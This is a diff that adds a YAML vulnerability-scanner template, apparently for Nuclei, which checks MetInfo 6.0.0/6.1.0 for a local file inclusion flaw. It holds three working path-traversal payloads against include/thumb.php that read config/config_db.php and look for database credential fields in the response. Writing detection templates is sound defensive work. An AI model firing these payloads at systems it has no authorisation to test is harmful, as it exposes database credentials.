@@ -1,0 +1,24 @@
+id: metinfo-lfi
+info:
+  author: pikpikcu
+  name: MetInfo 6.0.0/6.1.0 LFI
+  reference: https://paper.seebug.org/676/
+  severity: high
+  tags: metinfo,lfi
+requests:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - con_db_pass
+    - con_db_name
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/include/thumb.php?dir=http/.....///.....///config/config_db.php'
+  - '{{BaseURL}}/include/thumb.php?dir=.....///http/.....///config/config_db.php'
+  - '{{BaseURL}}/include/thumb.php?dir=http\\..\\..\\config\\config_db.php'
